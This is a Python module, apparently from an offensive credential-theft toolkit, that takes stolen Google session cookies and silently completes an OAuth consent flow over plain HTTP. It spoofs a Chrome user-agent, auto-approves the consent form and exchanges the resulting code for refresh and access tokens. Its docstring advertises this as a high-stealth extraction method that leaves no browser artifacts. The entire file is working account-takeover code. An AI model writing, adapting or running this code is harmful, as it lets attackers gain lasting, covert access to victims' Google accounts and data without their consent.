"""HTTP-only Google OAuth consent flow using stolen browser cookies.

Performs the full OAuth authorization_code grant flow via pure HTTP (urllib),
without launching Chrome.  This is the highest-stealth extraction method
(stealth 5 on Win/Linux) because it generates no new process and no browser
artifacts — only standard HTTPS requests from the Python process.

Flow:
  1. Accept decrypted Google session cookies as input
  2. Build a cookie jar with SID, HSID, SSID, APISID, SAPISID
  3. GET the OAuth authorization endpoint with the session cookies
  4. Follow redirects through Google's consent flow
  5. Parse the consent page HTML for the approval form
  6. Submit the approval form via POST
  7. Capture the auth code from the final redirect
  8. Exchange auth code for refresh_token + access_token
  9. Return the credential dict

Requires: Python stdlib only (urllib, http.cookiejar, html.parser).
"""

from __future__ import annotations

import html.parser
import http.cookiejar
import json
import logging
import re
import urllib.error
import urllib.parse
import urllib.request
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

# Realistic Chrome User-Agent — matches a recent stable release.
_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

_GOOGLE_AUTH_URL = "https://accounts.google.com/o/oauth2/v2/auth"
_GOOGLE_TOKEN_URL = "https://oauth2.googleapis.com/token"


class _ConsentFormParser(html.parser.HTMLParser):
    """Parse Google's OAuth consent page to extract form fields.

    Looks for the approval form (identified by action URL or form id)
    and extracts all hidden input fields plus the form action URL.
    """

    def __init__(self) -> None:
        super().__init__()
        self.forms: List[Dict] = []
        self._current_form: Optional[Dict] = None

    def handle_starttag(self, tag: str, attrs: list) -> None:
        attr_dict = dict(attrs)

        if tag == "form":
            self._current_form = {
                "action": attr_dict.get("action", ""),
                "method": attr_dict.get("method", "GET").upper(),
                "fields": {},
            }
            return

        if tag == "input" and self._current_form is not None:
            name = attr_dict.get("name")
            value = attr_dict.get("value", "")
            if name:
                self._current_form["fields"][name] = value

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


def _build_cookie_jar(
    cookies: Dict[str, str],
    domain: str = ".google.com",
) -> http.cookiejar.CookieJar:
    """Build a CookieJar from a dict of name->value pairs."""
    jar = http.cookiejar.CookieJar()
    for name, value in cookies.items():
        cookie = http.cookiejar.Cookie(
            version=0,
            name=name,
            value=value,
            port=None,
            port_specified=False,
            domain=domain,
            domain_specified=True,
            domain_initial_dot=domain.startswith("."),
            path="/",
            path_specified=True,
            secure=True,
            expires=None,
            discard=True,
            comment=None,
            comment_url=None,
            rest={"HttpOnly": ""},
        )
        jar.set_cookie(cookie)
    return jar


def _find_consent_form(forms: List[Dict]) -> Optional[Dict]:
    """Identify the approval/consent form from parsed forms.

    Google's consent page typically has a form whose action URL contains
    '/signin/oauth' or '/o/oauth2' and has hidden fields for state_wrapper,
    at, or similar XSRF tokens.
    """
    # Priority 1: form action contains consent/approval keywords
    for form in forms:
        action = form.get("action", "").lower()
        if any(kw in action for kw in ("/signin/oauth", "/o/oauth2", "approval", "consent")):
            return form

    # Priority 2: form with a state_wrapper or at field (XSRF token)
    for form in forms:
        fields = form.get("fields", {})
        if "state_wrapper" in fields or "at" in fields:
            return form

    # Priority 3: POST form with hidden fields (likely the consent form)
    for form in forms:
        if form.get("method") == "POST" and form.get("fields"):
            return form

    return None


class HttpOAuthCollector:
    """Perform Google OAuth consent flow via pure HTTP using stolen cookies.

    This collector does NOT inherit from BaseCollector because it is a
    utility called by other collectors (e.g., browser_cookies) rather than
    a standalone discoverable collector.

    Usage::

        collector = HttpOAuthCollector()
        result = collector.execute(
            cookies={"SID": "...", "HSID": "...", ...},
            client_id="your-client-id.apps.googleusercontent.com",
            redirect_uri="urn:ietf:wg:oauth:2.0:oob",
            scope="openid email profile",
        )
        if result:
            print(result["access_token"])
    """

    def execute(
        self,
        cookies: Dict[str, str],
        client_id: str,
        redirect_uri: str,
        scope: str,
        client_secret: Optional[str] = None,
    ) -> Optional[Dict]:
        """Run the full OAuth consent flow and return credentials.

        Args:
            cookies: Decrypted Google session cookies. Must include at least
                     SID and HSID for authentication. SAPISID is used for
                     the SAPISIDHASH authorization header if present.
            client_id: OAuth client ID.
            redirect_uri: OAuth redirect URI. Use 'urn:ietf:wg:oauth:2.0:oob'
                          for out-of-band capture, or a localhost URI.
            scope: Space-separated OAuth scopes.
            client_secret: Optional client secret for confidential clients.
                           Not needed for installed/native app clients.

        Returns:
            Dict with access_token, refresh_token, token_type, expires_in,
            scope, and id_token (if openid scope requested).
            None on failure.
        """
        required = {"SID", "HSID"}
        missing = required - set(cookies.keys())
        if missing:
            logger.error("Missing required cookies: %s", ", ".join(sorted(missing)))
            return None

        jar = _build_cookie_jar(cookies)
        opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(jar),
            urllib.request.HTTPRedirectHandler(),
        )

        headers = {
            "User-Agent": _USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }

        auth_params = urllib.parse.urlencode({
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "response_type": "code",
            "scope": scope,
            "access_type": "offline",
            "prompt": "consent",
        })
        auth_url = f"{_GOOGLE_AUTH_URL}?{auth_params}"

        logger.debug("Requesting authorization URL: %s", auth_url)

        try:
            req = urllib.request.Request(auth_url, headers=headers)
            resp = opener.open(req, timeout=30)
            page_html = resp.read().decode("utf-8", errors="replace")
            final_url = resp.url
        except urllib.error.URLError as e:
            logger.error("Failed to load authorization page: %s", e)
            return None

        auth_code = self._extract_code_from_url(final_url)
        if auth_code:
            logger.info("OAuth auto-approved — auth code captured from redirect")
            return self._exchange_code(auth_code, client_id, redirect_uri, client_secret)

        parser = _ConsentFormParser()
        try:
            parser.feed(page_html)
        except Exception as e:
            logger.error("Failed to parse consent page HTML: %s", e)
            return None

        consent_form = _find_consent_form(parser.forms)
        if consent_form is None:
            logger.error(
                "Could not find consent form on page (url=%s, forms_found=%d). "
                "The session cookies may be expired or insufficient.",
                final_url,
                len(parser.forms),
            )
            return None

        form_action = consent_form["action"]
        form_fields = dict(consent_form["fields"])

        for approve_field in ("submit_access", "approve", "allow"):
            if approve_field not in form_fields:
                form_fields[approve_field] = "true"

        if form_action and not form_action.startswith("http"):
            form_action = urllib.parse.urljoin(final_url, form_action)

        if not form_action:
            form_action = final_url

        logger.debug("Submitting consent form to: %s", form_action)

        post_data = urllib.parse.urlencode(form_fields).encode("utf-8")
        try:
            req = urllib.request.Request(
                form_action,
                data=post_data,
                headers={
                    **headers,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": final_url,
                    "Origin": "https://accounts.google.com",
                },
            )
            resp = opener.open(req, timeout=30)
            result_html = resp.read().decode("utf-8", errors="replace")
            result_url = resp.url
        except urllib.error.HTTPError as e:
            # 302/303 redirects with auth code in Location header
            if e.code in (302, 303) and e.headers.get("Location"):
                auth_code = self._extract_code_from_url(e.headers["Location"])
                if auth_code:
                    logger.info("Auth code captured from redirect after form submit")
                    return self._exchange_code(auth_code, client_id, redirect_uri, client_secret)
            logger.error("Consent form submission failed: %s", e)
            return None
        except urllib.error.URLError as e:
            # Connection refused to localhost redirect_uri = code is in the URL
            if hasattr(e, "reason") and "Connection refused" in str(e.reason):
                logger.debug("Redirect to localhost refused — checking URL for code")
            else:
                logger.error("Consent form submission failed: %s", e)
                return None

        auth_code = self._extract_code_from_url(result_url)
        if auth_code:
            logger.info("Auth code captured from final redirect URL")
            return self._exchange_code(auth_code, client_id, redirect_uri, client_secret)

        auth_code = self._extract_code_from_html(result_html)
        if auth_code:
            logger.info("Auth code captured from consent result page HTML")
            return self._exchange_code(auth_code, client_id, redirect_uri, client_secret)

        logger.error(
            "Could not extract auth code from consent flow result "
            "(url=%s). The consent page may require additional interaction.",
            result_url,
        )
        return None

    @staticmethod
    def _extract_code_from_url(url: str) -> Optional[str]:
        """Extract the authorization code from a redirect URL's query params."""
        if not url:
            return None
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if "code" in params:
            return params["code"][0]
        frag_params = urllib.parse.parse_qs(parsed.fragment)
        if "code" in frag_params:
            return frag_params["code"][0]
        return None

    @staticmethod
    def _extract_code_from_html(html_body: str) -> Optional[str]:
        """Extract the authorization code from the OOB success page HTML.

        Google's OOB flow displays the code in a <textarea> or a styled div
        with a specific pattern (4/xxxxx or similar).
        """
        # Pattern 1: code in a textarea element
        match = re.search(r"<textarea[^>]*>([^<]+)</textarea>", html_body)
        if match:
            candidate = match.group(1).strip()
            if candidate.startswith("4/") or len(candidate) > 20:
                return candidate

        # Pattern 2: code in an element with id="code"
        match = re.search(r'id="code"[^>]*>([^<]+)<', html_body)
        if match:
            return match.group(1).strip()

        # Pattern 3: code displayed as text matching the OAuth code format
        match = re.search(r"(4/[\w-]{20,})", html_body)
        if match:
            return match.group(1)

        return None

    @staticmethod
    def _exchange_code(
        code: str,
        client_id: str,
        redirect_uri: str,
        client_secret: Optional[str] = None,
    ) -> Optional[Dict]:
        """Exchange authorization code for access + refresh tokens.

        Args:
            code: The authorization code from the consent flow.
            client_id: OAuth client ID.
            redirect_uri: Must match the redirect_uri used in the auth request.
            client_secret: Required for web/confidential clients.

        Returns:
            Token response dict, or None on failure.
        """
        params = {
            "code": code,
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "grant_type": "authorization_code",
        }
        if client_secret:
            params["client_secret"] = client_secret

        data = urllib.parse.urlencode(params).encode("utf-8")
        req = urllib.request.Request(
            _GOOGLE_TOKEN_URL,
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace") if e.fp else ""
            logger.error("Token exchange failed (HTTP %d): %s", e.code, body)
            return None
        except urllib.error.URLError as e:
            logger.error("Token exchange request failed: %s", e)
            return None
